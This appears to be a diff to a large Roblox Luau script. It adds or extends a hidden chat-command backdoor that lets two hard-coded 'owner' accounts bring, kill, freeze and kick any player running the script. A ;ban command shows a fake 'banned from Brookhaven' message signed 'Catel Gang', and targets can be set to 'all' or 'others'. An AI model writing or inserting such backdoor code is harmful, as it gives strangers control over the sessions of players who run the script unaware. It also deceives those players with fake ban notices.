@@ -1038,22 +1038,59 @@ local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
 
 local plr = Players.LocalPlayer
-local Owners = {"AGKaBaap_YadsanAsuka", "CSXLuffy01"}
+local Owners = {"AGKaBaap_YadsanAsuka", "CsXluffy01"}
+local isFrozen = false
 
 local function isOwner(name)
+	local lowerName = name:lower()
 	for _, ownerName in ipairs(Owners) do
-		if name == ownerName then
+		if lowerName == ownerName:lower() then
 			return true
 		end
 	end
 	return false
 end
 
-local function matchesTarget(player, targetName)
+local function matchesTarget(player, targetName, senderPlayer)
 	local lowerTarget = targetName:lower()
+	if lowerTarget == "all" then
+		return true
+	elseif lowerTarget == "others" then
+		return player ~= senderPlayer
+	elseif lowerTarget == "me" then
+		return player == senderPlayer
+	end
+
 	return player.Name:lower():sub(1, #lowerTarget) == lowerTarget
 		or player.DisplayName:lower():sub(1, #lowerTarget) == lowerTarget
 end
+
+local function setFrozen(state)
+	isFrozen = state
+	local char = plr.Character
+	if not char then return end
+
+	local hum = char:FindFirstChildOfClass("Humanoid")
+	if hum then
+		if state then
+			hum.Sit = false
+		end
+		hum.PlatformStand = state
+	end
+
+	for _, part in ipairs(char:GetDescendants()) do
+		if part:IsA("BasePart") then
+			part.Anchored = state
+		end
+	end
+end
+
+plr.CharacterAdded:Connect(function()
+	if isFrozen then
+		task.wait(0.1)
+		setFrozen(true)
+	end
+end)
 
 TextChatService.MessageReceived:Connect(function(textResult)
 	local sender = textResult.TextSource
@@ -1067,29 +1104,46 @@ TextChatService.MessageReceived:Connect(function(textResult)
 	local targetName = rawArgs[2]
 
 	if cmd == ";bring" and targetName then
-		if matchesTarget(plr, targetName) and senderPlayer.Character and plr.Character then
-			plr.Character:PivotTo(senderPlayer.Character:GetPivot())
-		end
-
-	elseif cmd == ";kill" then
-		if not targetName or matchesTarget(plr, targetName) then
-			if plr.Character then
-				plr.Character:BreakJoints()
+		if matchesTarget(plr, targetName, senderPlayer) and plr ~= senderPlayer then
+			if senderPlayer.Character and plr.Character then
+				plr.Character:PivotTo(senderPlayer.Character:GetPivot())
 			end
 		end
 
+	elseif cmd == ";kill" then
+		if not targetName or matchesTarget(plr, targetName, senderPlayer) then
+			local char = plr.Character
+			if char then
+				local hum = char:FindFirstChildOfClass("Humanoid")
+				if hum then
+					hum.Health = 0
+				end
+				char:BreakJoints()
+			end
+		end
+
+	elseif cmd == ";freeze" and targetName then
+		if matchesTarget(plr, targetName, senderPlayer) then
+			setFrozen(true)
+		end
+
+	elseif cmd == ";unfreeze" and targetName then
+		if matchesTarget(plr, targetName, senderPlayer) then
+			setFrozen(false)
+		end
+
 	elseif cmd == ";kick" and targetName then
-		if matchesTarget(plr, targetName) then
+		if matchesTarget(plr, targetName, senderPlayer) then
 			local reason = table.concat(rawArgs, " ", 3)
 			if reason == "" then reason = "No reason provided." end
 			plr:Kick("\n[ EXC KICK ]\nAdmin: " .. senderPlayer.Name .. "\nReason: " .. reason)
 		end
 
 	elseif cmd == ";ban" and targetName then
-		if matchesTarget(plr, targetName) then
+		if matchesTarget(plr, targetName, senderPlayer) then
 			local reason = table.concat(rawArgs, " ", 3)
 			if reason == "" then reason = "Banned by Catel Gang" end
-			plr:Kick("\n@@@@@@-@-@-@-@-@-@\nbanned from Brookhaven\nduration 999999 days!\n\nReason: " .. reason:upper() .. "\nAdmin: " .. senderPlayer.Name)
+			plr:Kick("\n@@@@@@-@-@-@-@-@-@\nbanned from Brookhaven\nduration 2 hours!\n\nReason: " .. reason:upper() .. "\nAdmin: " .. senderPlayer.Name)
 		end
 
 	elseif cmd == "!stopall" then
@@ -1097,4 +1151,5 @@ TextChatService.MessageReceived:Connect(function(textResult)
 		if blur then blur:Destroy() end
 	end
 end)
+
 
